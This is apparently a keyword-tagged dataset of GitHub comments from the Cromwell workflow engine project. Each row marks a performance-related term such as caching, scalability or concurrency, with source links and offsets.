Performance,"@geoffjentry is the idea for this to enable horizontal scalability of cromwell? If so, we are much looking forward to this support!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3339#issuecomment-371822508:55,scalab,scalability,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3339#issuecomment-371822508,1,['scalab'],['scalability']
Performance,@geoffjentry probably better to treat a cached-to 404 the same as a failed cache hit copy so we can fall back to trying another cache hit rather than re-running the job.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306308816:40,cache,cached-to,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306308816,3,['cache'],"['cache', 'cached-to']"
Performance,"@geoffjentry the . > Extra logging around unexpected keys. commit was the key:. <img width=""1316"" alt=""screen shot 2017-04-05 at 12 13 07 pm"" src=""https://cloud.githubusercontent.com/assets/13006282/24715464/6515445e-19f9-11e7-9c54-34698bfe9d87.png"">. Before moving that message send I was seeing that programming error appear as a rare race condition (but often enough to fail a few sbt tests every time). I think my mistake was that the `createResponseSet` wasn't necessarily called from a `receive` method so akka was quite at liberty to interleave it with calls to `fulfillOrLog`, which I had assumed would be impossible.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2102#issuecomment-291915185:337,race condition,race condition,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2102#issuecomment-291915185,1,['race condition'],['race condition']
Performance,"@geoffjentry what is the reflectively loaded classes? If it's just the docs, I can do a quick ReadMe ""search and replace"" 😁",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-328190721:38,load,loaded,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-328190721,1,['load'],['loaded']
Performance,@geoffjentry what was the effect on performance with `mapValues`? What would users (FireCloud or individual Cromwell users) notice?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333185621:36,perform,performance,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333185621,1,['perform'],['performance']
Performance,"@geoffjentry will a job call cache if a user overrides runtime attributes? ; @LeeTL1220 What do you mean by your last comment? Do you mean that there are certain parameters that cause a cache-miss when you change them, but you want them to cache-hit? That might be a different issue, I can create it if you want to explain it to me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325784438:29,cache,cache,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325784438,3,['cache'],"['cache', 'cache-hit', 'cache-miss']"
Performance,"@geoffjentry yeah but assuming it's on the same EC that doesn't actually solve anything. . It'd be much better to have... (wait for it....)... a work pulling system that limits how many of these are going on at once. Now admittedly that's an easier transition if you already have the actors in place but unless you want the full scalability fix here, I suggest we address that as part of the scalability sprint (and I'd be very happy to do it then!)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257712585:329,scalab,scalability,329,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257712585,2,['scalab'],['scalability']
Performance,@gsaksena Not necessarily. I know that there are people who have tuned their preemption number specifically thinking about total time on top of cost. . I'm not saying that this is a bad idea but it's not necessarily as cut & dry as you're making out.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293684749:65,tune,tuned,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293684749,1,['tune'],['tuned']
Performance,"@helgridly commented on [Thu Apr 13 2017](https://github.com/broadinstitute/wdl4s/issues/103). I'm loading a WDL in wdl4s using `WdlNamespaceWithWorkflow.load(my_wdl, Seq())` -- i.e. passing no import resolvers. If the WDL contains imports, I'd expect it to fail and complain that it can't resolve the imports because I haven't specified any resolvers. (In the current code, that'd be [here](https://github.com/broadinstitute/wdl4s/blob/develop/src/main/scala/wdl4s/WdlNamespace.scala#L198).). However, what actually happens is that wdl4s tries to turn the import into a `File` object [here](https://github.com/broadinstitute/wdl4s/blob/develop/src/main/scala/wdl4s/Import.scala#L18). If that's not a valid kind of file path (perhaps because of a custom URI scheme, or because you're running Windows and colons aren't allowed in filenames), wdl4s blows up with some java-native exception. (In the Windows case, that's `java.nio.file.InvalidPathException`.). TLDR: wdl4s should throw a useful error if your WDL contains imports but you haven't specified resolvers. It probably shouldn't attempt to load the imports outside the context of a resolver, either. ---. @helgridly commented on [Thu Apr 13 2017](https://github.com/broadinstitute/wdl4s/issues/103#issuecomment-293936559). I discussed this with @Horneth and he's provided me with a workaround: I can check for the existence of imports in my code by loading the AST directly using something like `Option(ast).map(_.getAttribute(""imports"")).toSeq` (lifted from [here](https://github.com/broadinstitute/wdl4s/blob/develop/src/main/scala/wdl4s/WdlNamespace.scala#L185)). So consider this a non-urgent enhancement rather than a cloud of fire.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2701:99,load,loading,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2701,4,['load'],"['load', 'loading']"
Performance,"@horneth - so I see 2 Futures in here. One the little bit changing the state (around the Props) and the other was resolveAndEvaluate. As background for my statement I'll say the following:; - We've already seen firsthand the havoc which can erupt from having Futures rolling around inside an Actor. They break the Actor Model's abstraction that the internals of an actor are single threaded, meaning you now have to reason about shared mutable state, etc. We _can_ do that, but there are easier paths than actors to deal with that. We've been better about this recently but my concern is that it's too easy for stuff like that to sneak into what were previously pure Futures. Mixing Futures & Actors is not really a great idea.; - There are two async operations in the actor, which means that it is certainly doing two different things (I'll admit that the creation of an actor is a fairly lame 'thing'), disrupting Akka's mantra that actors should do one thing only. What I was suggesting was that the work being performed by these Futures be themselves pushed to their own actors. When they complete they can message back to this one, and those messages could be use to manage state transitions and such. (and to be clear, this is _not_ our little 'tol' code phrase - it's something I think we need to be much better about as we refactor cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218573678:1014,perform,performed,1014,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218573678,2,['perform'],['performed']
Performance,"@illusional - The mount point should be `/cromwell_root` when you create the custom AMI. The is the filesystem path that Cromwell uses by default for task data. When creating your config file you will need to specify the region you are operating it - i.e. where your S3 bucket and Batch queues are. All of the above should be preconfigured if you use the [Cromwell ""All-in-One"" template](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/#tldr).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-445968094:287,queue,queues,287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-445968094,1,['queue'],['queues']
Performance,"@illusional . A partial hash is a great idea. I am now downloading a 82 GB bam file in order to check the speed of the algorithm, but unfortunately my network connection is a 100mbits on this PC. It will take 2 hours. Even with a 1000mbit perfect connection it would take at least 12 minutes. So computation time is indeed not the limit here. We need to thinks this through though. Some files are more similar at the beginning (VCF headers come to mind) than at the end. So only hashing the beginning carries with it some major concerns. Using the size is indeed a good thing, and I think we should also include the modification time.; In that case `size+modtime+xx64hsum of first 10mb` should create a unique enough identifier for each file while negating any network performance issues. I think this strategy should be called `hpc`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599448301:769,perform,performance,769,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599448301,1,['perform'],['performance']
Performance,@illusional . At our cluster we use both `cached-copy` and `path+modtime` and call-caching works fine. All our call-caching failures where related to how we implemented the tasks. Have you tried using `cromwell run -m metadata.json workflow.wdl`? In that case the call cache variables will be saved in the `metadata.json` file. It is very informative to see how these change between runs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346#issuecomment-589548236:42,cache,cached-copy,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346#issuecomment-589548236,2,['cache'],"['cache', 'cached-copy']"
Performance,"@illusional ; I am happy you like this change. I have checked your other post in #4945 and your use case is similar to ours. We use a SGE cluster and run cromwell from the login node. The message is really easy to implement. But I am not sure what would be the right way to tackle this. I would like some consistency with the other localization methods, and I don't know if they message when a file is being copied. I haven't tested cached-copy in conjunction with call-caching and path+modtime yet. If I find issues with it I will create a new issue on the cromwell issue tracker, ping you, and see if I can fix it in a PR. We rely heavily on the path+modtime strategy as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507966522:433,cache,cached-copy,433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-507966522,1,['cache'],['cached-copy']
Performance,"@illusional I tried to reproduce the issue, but cached-copy localization didn't work for me with both cromwell-50 and cromwell-51 when using configuration file you provided.; On the other hand, when using the following configuration file, `cached-inputs/` was successfully populated for me by both 50 and 51 cromwells:; ```; include required(classpath(""application"")). backend: {; ""default"": ""Local"",; ""providers"": {; ""Local"": {; ""actor-factory"": ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"",; ""config"": {; ""root"": ""/Users/gsterin/cachedcopy/exec_dir"",; ""filesystems"": {; ""local"": {; ""localization"": [""cached-copy""]; }; }; }; }; }; }; ```. It looks like configuration key enabling cached-copy localization should be `filesystems.local.localization` instead of `filesystems.local.duplication-strategy` and also looks like joining configuration keys with `.` symbol doesn't work when your configuration is in pure JSON format (but it works with HOCON format).; So `""filesystems.local.duplication-strategy"": [""cached-copy""]` should be replaced by ; ```; ""filesystems"": {; ""local"": {; ""localization"": [""cached-copy""]; }; }; ```. But I'm still not sure why cached-copy localization worked in Cromwell 50 with your configuration. Would you be able to double-check please?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5533#issuecomment-642196399:48,cache,cached-copy,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5533#issuecomment-642196399,8,['cache'],"['cached-copy', 'cached-inputs', 'cachedcopy']"
Performance,"@illusional Thanks for this. I have been looking into (but not having time for) an easy option that would disable the hash lookup altogether. Cromwell connecting to quay.io while quay.io is down causes crashes we do not want in production. There is a configuration option for this. So it was easy. Unfortunately the hash lookup is coupled with the call-caching mechanic. No hash, no cache. Which is something to be aware of. I was wondering if the easiest way wouldn't be to have the lookup be a command in the config. Just like `docker_kill` there could be a `docker_lookup_hash`. That way you can override the default with a custom command that returns a string (https://stackoverflow.com/a/39376254). . For example:; ```; $ docker inspect --format='{{index .RepoDigests 0}}' mysql:5.6; mysql@sha256:19a164794d3cef15c9ac44754604fa079adb448f82d40e4b8be8381148c785fa; ```; This does NOT need the internet. Similarly, this would enable hash-lookup for singularity users as well without internet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330:383,cache,cache,383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330,1,['cache'],['cache']
Performance,"@illusional You can set the priorities for localization like this; ```; localization: [; ""hard-link"", ""cached-copy"", ""copy""; ]; ```; In that case it will try to hard-link first. It works on our setup. > Hey @rhpvorderman, just wanted to check in and say this has been working great!. Thanks for letting us know. In our institute it is also working great. We have had zero crashes, deadlocks etc. related to this code. So we are also quite happy with it. I am very glad it is useful to others as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-571456289:103,cache,cached-copy,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-571456289,1,['cache'],['cached-copy']
Performance,"@illusional, I've added Singularity installation docs, and udocker cache docs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464537286:67,cache,cache,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464537286,1,['cache'],['cache']
Performance,"@illusional. I did some benchmarking on xxh64sum vs md5sum on a 35GB file. Results:; * Just reading the file with `cat <file> /dev/null` took 18 seconds. Virtually no CPU time; * xxh64sum took 24 seconds of which 3.6 seconds cpu time; * md5sum took 53 seconds, of which 48 seconds cpu time. Md5sum was cpu limited. So CPU was 100% all the time. xxh64sum was limited by the transfer speed of the disk (nvme ssd), so cpu usage never exceeded 20%. This means the bottleneck becomes I/O based, and for 200 GB files on NFS this can indeed be a big problem. I have added a `hpc` strategy` that takes the last modified time, size, and the xxh64sum of the first 10 megabytes of the file to alleviate this problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599516129:460,bottleneck,bottleneck,460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599516129,1,['bottleneck'],['bottleneck']
Performance,@jmthibault79 Adding this to the retry list would retry the user's job. Is that really what you're advocating for?. This is coming from JES. They've actually been requested (by both Firecloud & other users) to tune down the retries that they do on the gsutil up/downloading.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2233#issuecomment-298708235:210,tune,tune,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2233#issuecomment-298708235,1,['tune'],['tune']
Performance,"@jsotobroad As scatter/gather seem to be concurrency events I think you're running into the maximum IOPS (Input/Output Operations Per Second) available from Google. The simulatneous Google disk IOPS are as follows, based on the following link and shown in the table below:. https://cloud.google.com/compute/docs/disks/performance#type_comparison. | Read | Write |; | --- | --- |; | 3000 IOPS | 0 IOPS |; | 2250 IOPS | 3750 IOPS |; | 1500 IOPS | 7500 IOPS |; | 750 IOPS | 11250 IOPS |; | 0 IOPS | 15000 IOPS |. There are other ways this might be tackled where the IOPS is throttled, or a few architectural changes would need to be done where it would write locally to the VM and then transferred over in a preemptive way. There is a microservices approach, but that is a major architectural change for Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237608696:41,concurren,concurrency,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237608696,3,"['concurren', 'perform', 'throttle']","['concurrency', 'performance', 'throttled']"
Performance,@katevoss ; I would like to add our use-case for the ability to access an ID of a workflow/subworkflow. Our users want the output of the Cromwell to be copied to their local locations and they complain that they cannot read the directory structure - I agree with them as they are data scientists and they want something useful after the pipeline finishes. As we provide the service we are responsible to provide them with something. An idea was to use [croo](https://github.com/ENCODE-DCC/croo) to achieve this. It is really useful solution but it requires manual intervention and knowledge of the pipeline IDs etc. Thus I though I could split the workflow into root and two sub-workflows: `do-the-job` and `copy-files`. However to achieve this the `copy-files` would need to have an access to the `do-the-job` sub-workflow ID or at least the root workflow ID to query for the metadata. I agree it is not deterministic and it should not be. Such a task cannot be cached too.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537417825:963,cache,cached,963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537417825,1,['cache'],['cached']
Performance,"@katevoss @geoffjentry <https://github.com/geoffjentry> I do not know what; those runtime attributes would be. Someone on red team would be much; better suited to answer that. On Tue, Aug 29, 2017 at 4:18 PM, Jeff Gentry <notifications@github.com>; wrote:. > @katevoss <https://github.com/katevoss> in a world where our runtime; > attrs weren't fubar we should be caching on what values were actually used.; > For instance if a user wants to swap in their own docker image or change; > the number of CPUs it should only cache to their variant.; >; > And yeah, @LeeTL1220 <https://github.com/leetl1220> brings up a good; > point - there are some parameters which should never cause the outcome to; > change but do get counted against caching.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325789100>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk8uWAvdQtT2jHiCFk3jR73-uU4Zkks5sdHIsgaJpZM4JWcLP>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325842489:520,cache,cache,520,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325842489,1,['cache'],['cache']
Performance,"@katevoss @geoffjentry @kcibul @dshiga . The HCA has no current need for prioritization of workflows, but has a strong need for the ability to submit jobs without starting them (in a queue) and then start them later on. Our entire infrastructure design relies on this feature existing. This ticket is framed by Kristian above as though that functionality already exists, but from my understanding it does not? . I believe it is @ktibbett and the green team / gp production who really need the prioritization feature, so I'll tag her here to add in their use cases.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-327938812:183,queue,queue,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1566#issuecomment-327938812,1,['queue'],['queue']
Performance,"@katevoss As long as we're happy providing users a bi-directional loaded gun, it's easy to do. The only difficulty here is coming up with a scheme that prevents people from overwriting their files, but KT doesn't care about that here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325773239:66,load,loaded,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325773239,1,['load'],['loaded']
Performance,@katevoss Specifically my concern has always been providing the ability to execute wdl functions in a controlled fashion via a worker pool (perhaps not even in the same JVM as the main engine) for scalability/robustness reasons. As it stands now a cromwell server could get crushed by a ton of these things happening all at once,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2084#issuecomment-288849912:197,scalab,scalability,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2084#issuecomment-288849912,1,['scalab'],['scalability']
Performance,"@katevoss in a world where our runtime attrs weren't fubar we should be caching on what values were actually used. For instance if a user wants to swap in their own docker image or change the number of CPUs it should only cache to their variant. And yeah, @LeeTL1220 brings up a good point - there are some parameters which should never cause the outcome to change but do get counted against caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325789100:222,cache,cache,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325789100,1,['cache'],['cache']
Performance,"@katevoss seems to be, yeah. This is a specific fix to the problem in #2576 which also comes with extra benefits like throttling and batching to make it generally much more reliable and scalable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2612#issuecomment-349133282:186,scalab,scalable,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2612#issuecomment-349133282,1,['scalab'],['scalable']
Performance,"@katevoss we can reuse the result even if the original input file is gone, because we record the hash of the file at execution time. That way, even if the old input file is modified, we won't call-cache unless the new input file matches what was used to generate the original result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560563:197,cache,cache,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560563,1,['cache'],['cache']
Performance,"@katevoss, it not being available in FireCloud is my high-level issue - it turns out that since FireCloud currently implements Cromwell 28, [call_caching_placeholder.txt gets placed, even though it is actually cache-by-copy rather than reference](https://gatkforums.broadinstitute.org/firecloud/discussion/10282/confusing-file-left-in-call-cached-execution-directory). . This makes me believe that it should be trivial to leave a file or log entry with details of _why_ a call was cached, which would be quite useful to me, or anyone else trying to troubleshoot an unexpected occurrence like this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335540147:210,cache,cache-by-copy,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335540147,3,['cache'],"['cache-by-copy', 'cached', 'cached-execution-directory']"
Performance,"@kcibul @ruchim Could you opine (since ""Job Avoidance"" is certainly now available) what kind of behaviour we want if we ""clear up"" a call-cached task?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/601#issuecomment-254317040:138,cache,cached,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/601#issuecomment-254317040,2,['cache'],['cached']
Performance,"@kcibul I believe GATK can perform incremental joint calling, so then you should be able to use a collection of Cromwells submissions to build it up. Would that work?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228096103:27,perform,perform,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228096103,1,['perform'],['perform']
Performance,"@kcibul I don't know. Because the ticket @mcovarr linked sounded like there was a magic setting somewhere I googled around a bit and found some references to badness. I didn't check, however. Still something to look at. Also I've been using MySQL not CloudSQL, perhaps that matters. I got to the point where if I set my batch size high enough (I was generating on the order of ~15k events to write per second, FWIW) my overall performance was such that I was getting a sustained rate of ~1500-1700 (I forget exactly) requests per second on the submission side, which is certainly still a lot less than I was getting w/o metadata at all but a heck of a lot better than I was able to do otherwise. It's entirely possible that all I did was move the goalpost back and that if I extended my test even further eventually I'd see the same problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269497705:427,perform,performance,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269497705,1,['perform'],['performance']
Performance,@kcibul I'm advocating that this earns the `scalability` label but leaving it up to you,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1623#issuecomment-267834071:44,scalab,scalability,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1623#issuecomment-267834071,1,['scalab'],['scalability']
Performance,@kcibul When making the Q3 scalability bucket I think that verification of what @kshakir said above should be part of it,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-267833739:27,scalab,scalability,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-267833739,1,['scalab'],['scalability']
Performance,@kcibul this is likely a very nontrivial fix in 0.19 - can we discuss importance and if it should be queued up for work?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/800#issuecomment-229770714:101,queue,queued,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/800#issuecomment-229770714,1,['queue'],['queued']
Performance,"@kcibul what port, the web server associated with the Cromwell?. It can't be just the host as the host might have multiple cromwells running on it and this needs to work in all situations, not just in a load balanced world.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371248096:203,load,load,203,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3340#issuecomment-371248096,1,['load'],['load']
Performance,"@kcibul what's the downside of just splitting every interval in the original set (N=2500) into 4 even pieces? Is it just that we won't be able to ensure that each quarter is equally balanced? Because rather than spending effort balancing shards, I'd rather optimize the GATK code. Thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2175#issuecomment-294228016:257,optimiz,optimize,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2175#issuecomment-294228016,1,['optimiz'],['optimize']
Performance,"@kshakir From the PR note: ""currently loading in wdl4s as an unmanaged jar, that'll change prior to merging""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/365#issuecomment-170286732:38,load,loading,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/365#issuecomment-170286732,1,['load'],['loading']
Performance,"@kshakir Per https://github.com/broadinstitute/cromwell/pull/2547, I believe that concurrent-job-limit is now available on all backends, so this issue is null and void. Correct?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1751#issuecomment-326410556:82,concurren,concurrent-job-limit,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1751#issuecomment-326410556,1,['concurren'],['concurrent-job-limit']
Performance,"@kshakir helpfully notes:; >That error looks like JNI, that I suspect is jython related, thus is probably heterodon. Heterodon was slimmed down to remove everything NOT tested via mac and/or CI. So since we don’t have any :travis: / :jenkins: testing windows I would not expect heterodon to work. Good news (?): we still support shell invoking `cwltool`, but I have zero expectation for that to work on windows either... So this behavior is likely the result of a deliberate and helpful size optimization.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480391597:492,optimiz,optimization,492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480391597,1,['optimiz'],['optimization']
Performance,"@kshakir mentioned in #1202 that one will soon be able to specify runtime attributes via the Config backend and not through code. Any implementation of this will work for us, provided that:; 1. One can specify arbitrary runtime attributes with values that can contain any characters, including nested double quotes (escaped if necessary).; 2. Arbitrary runtime attributes can be specified both within a single task in a WDL file, and in a workflow options JSON file. For example, using runtime attributes ""-app"" (application profile), ""-q"" (queue), ""-M"" (memory), ""-n"" (processors) and ""-R"" (resource requirements), the submit command line structure for LSF would be of the form:. `bsub -app large -q idle -M 125829120 -n 16,16 -R ""swp > 15 && span[hosts=1]"" -J ${job_name} -cwd ${cwd} -o ${out} -e ${err} /bin/sh ${script}`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1217#issuecomment-236262636:541,queue,queue,541,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1217#issuecomment-236262636,1,['queue'],['queue']
Performance,"@markjschreiber . > The EC2 workers contain a script that automatically expands that mount; users don't need to set that up. No custom AMI is required, in theory any; AMI that can work with ECS could be used. Is this a new feature of all new ECS Optimized Amazon Linux instances?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662080007:246,Optimiz,Optimized,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662080007,1,['Optimiz'],['Optimized']
Performance,"@markjschreiber . I tested your theory, and while the job was able to complete successfully the second time around (after changing the job definition), it didn't update the status in the Cromwell database. Do you reckon it should be possible for me to manually change a record in the database in order to get cromwell to continue where it left off, or will I need to resubmit the entire workflow, and hope that CallCaching is working?. In this particular workflow I'm running, I've observed that CallCaching works.... sometimes(?).... but I was surprised by the amount of Cache misses I observed, which I'm not really sure how to troubleshoot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775:572,Cache,Cache,572,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775,1,['Cache'],['Cache']
Performance,"@mcnelsonsema4 - how many concurrent jobs are in the scatter, and are you running multiple workflows with the same WDLs, but different inputs, at the same time?. Cromwell creates a new job definition revision with every job submission. This is because of the way task paths are handled via container volumes and mount points.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-502888987:26,concurren,concurrent,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-502888987,1,['concurren'],['concurrent']
Performance,"@mcovarr -- can you describe what we can't do now, that will be possible in the future? Or is this just an optimization/efficiency item?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/813#issuecomment-221260748:107,optimiz,optimization,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/813#issuecomment-221260748,1,['optimiz'],['optimization']
Performance,@mcovarr @kcibul Can we refine this a bit? This sounds like it could involve the `scalability` label,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-267833782:82,scalab,scalability,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-267833782,1,['scalab'],['scalability']
